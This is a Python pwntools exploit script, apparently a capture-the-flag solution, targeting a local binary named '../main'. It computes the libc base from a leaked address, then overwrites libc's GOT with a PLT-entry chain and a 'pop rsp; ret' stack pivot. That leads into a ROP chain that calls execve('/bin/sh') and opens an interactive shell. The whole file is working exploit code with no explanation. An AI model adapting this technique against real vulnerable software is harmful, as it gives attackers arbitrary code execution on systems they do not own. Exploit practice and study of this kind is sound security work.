from pwn import *
context.arch='amd64'
from pathlib import Path
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

class ROPgadget():
    def __init__(self,libc: ELF,base=0):
        if Path("./gadgets").exists():
            print("[!] Using gadgets, make sure that's corresponding to the libc!")
        else:
            fp = open("./gadgets",'wb')
            subprocess.run(f"ROPgadget --binary {libc.path}".split(" "),stdout=fp)
            fp.close()
        fp = open("./gadgets",'rb')
        data = fp.readlines()[2:-2]
        data = [x.strip().split(b" : ") for x in data]
        data = [[int(x[0],16),x[1].decode()] for x in data]
        fp.close()
        self.gadgets = data
        self.base  = base
    def search(self,s):
        for addr,ctx in self.gadgets:
            if ctx == s:
                return addr+self.base
        return None    
def fx1(libc: ELF, rop_chain = []):
    got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    plt0 = libc.address + libc.get_section_by_name(".plt").header.sh_addr
    rop = ROPgadget(libc,libc.address)
    pivot = rop.search("pop rsp ; ret")
    return got+8, flat(
        p64(got+8+0x38*8), # the rop chain address
        p64(pivot),
        p64(plt0) * 0x36, flat(rop_chain))


libc    = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p       = process("../main")

# gdb.attach(p,'b *0x7ffff7c2c000')
base = int(p.readline(),16) - (0x7ff6a25244a0-0x7ff6a24c8000)-0x4250
# info(hex(base))
libc.address=base
rop = ROP(libc)
rdi = rop.find_gadget(["pop rdi",'ret'])[0]
rsi = rop.find_gadget(["pop rsi",'ret'])[0]
rdx = rop.find_gadget(["pop rdx","pop r12",'ret'])[0]
rop_chain = [rdi,libc.search(b"/bin/sh").__next__(),rsi,0,rdx,0,0,libc.sym['execve']]
dest, payload = fx1(
    libc, rop_chain=rop_chain
)
success(hex(len(payload)))
plt0 = libc.address + libc.get_section_by_name(".plt").header.sh_addr
context.arch='amd64'
# info(hex(plt0))
p.send(p64(dest))
p.send(p64(len(payload)))
p.send(payload)
p.interactive()